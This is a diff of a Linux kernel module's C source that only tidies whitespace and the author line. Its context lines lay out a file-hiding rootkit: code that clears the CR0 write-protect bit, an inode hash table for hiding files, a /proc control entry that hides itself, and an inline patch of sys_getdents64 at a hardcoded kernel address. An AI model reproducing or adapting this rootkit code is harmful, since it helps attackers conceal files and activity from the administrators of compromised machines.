@@ -22,9 +22,9 @@ unsigned int clearcr0(void)
 	asm volatile ("movl %%cr0, %%eax"
 			: "=a"(cr0));
 	ret = cr0;
-	
+
 	cr0 &= 0xfffeffff;
-	
+
 	asm volatile ("movl %%eax, %%cr0"
 			:: "a"(cr0));
 	return ret;
@@ -60,21 +60,20 @@ unsigned int hino_hash(u64 ino)
 int hidefile(u64 ino, struct hideino ***prev, struct hideino ***head)
 {
 	struct hideino **hino_list, *hnode, **old;
-	unsigned int hidx;	
-	hidx = hino_hash(ino);	
+	unsigned int hidx;
+	hidx = hino_hash(ino);
 	hino_list = &hino_tbl[hidx];
 
 	if (*hino_list == NULL)
 		return 0;
 
 	for (hnode = *hino_list, old = hino_list;
-				hnode != NULL;
-					old = &hnode, hnode = hnode->next) {
-
+			hnode != NULL;
+			old = &hnode, hnode = hnode->next) {
 		if (hnode->ino == ino) {
 			if (prev)
 				*prev = old;
-			
+
 			if (head)
 				*head = hino_list;
 			return 1;
@@ -92,8 +91,7 @@ void delhidefile(u64 ino)
 	if (*head == *prev) {
 		node = *prev;
 		*prev = node->next;
-	}
-	else {
+	} else {
 		node = (*prev)->next;
 		(*prev)->next = node->next;
 	}
@@ -104,19 +102,19 @@ void delhidefile(u64 ino)
 void addhidefile(u64 ino)
 {
 	struct hideino **hino_list, *hnode;
-	unsigned int hidx;	
+	unsigned int hidx;
 	if (hidefile(ino, NULL, NULL) == 1)
 		return;
 
-	hidx = hino_hash(ino);	
+	hidx = hino_hash(ino);
 	hino_list = &hino_tbl[hidx];
 
 	hnode = (struct hideino *)kmalloc(sizeof(*hnode), GFP_KERNEL);
 	if (hnode == NULL) {
 		printk(KERN_ALERT "[ERR]cannot kmalloc\n");
 	}
-	hnode->ino = ino;	
-	hnode->next = *hino_list; 	
+	hnode->ino = ino;
+	hnode->next = *hino_list;
 	*hino_list = hnode;
 	hidenum++;
 }
@@ -182,28 +180,28 @@ void user_init(void)
 		printk(KERN_ALERT "[ERR]cannot create %s\n", HIDE_DIR);
 		return ;
 	}
-	
-	dproc = create_proc_entry(HIDE_PROC_ENTRY, 0644, dir);	
+
+	dproc = create_proc_entry(HIDE_PROC_ENTRY, 0644, dir);
 	if (!dproc) {
 		printk(KERN_ALERT "[ERR]cannot create %s\n", HIDE_ENTRY);
 		return ;
 	}
-	
+
 
 	dproc->read_proc = pread;
 	dproc->write_proc = pwrite;
 
 	/* hide self */
 	phf_ino = 0xffffffff & dir->low_ino;
-	addhidefile(phf_ino);		
+	addhidefile(phf_ino);
 	printk(KERN_ALERT "userland interface init ok\n");
 }
 
 void user_exit(void)
 {
 	remove_proc_entry(HIDE_PROC_ENTRY, dir);
-	remove_proc_entry(HIDE_PROC_DIR, NULL);		
-	
+	remove_proc_entry(HIDE_PROC_DIR, NULL);
+
 	printk(KERN_ALERT "user exit\n");
 }
 
@@ -240,7 +238,7 @@ unsigned int ih(unsigned int start, unsigned int feature, unsigned int new)
 				resumecr0(orig_cr0);
 
 				return save;
-			}	
+			}
 		}
 	}
 	return 0;
@@ -249,7 +247,7 @@ unsigned int ih(unsigned int start, unsigned int feature, unsigned int new)
 static unsigned int offset, start, feature;
 static int __init hide_init(void)
 {
-	start = 0xc04dd457;			//sys_getdents64
+	start = 0xc04dd457;			// sys_getdents64
 
 	feature = 0xba;				// asm code of "mov xxx, %edx"
 	offset = ih(start, (unsigned int)feature,(unsigned int)new_filldir64);
@@ -277,4 +275,4 @@ static void __exit hide_exit(void)
 module_init(hide_init);
 module_exit(hide_exit);
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("wangxiaochen0@gmail.com");
+MODULE_AUTHOR("Xiaochen Wang <wangxiaochen0@gmail.com>");
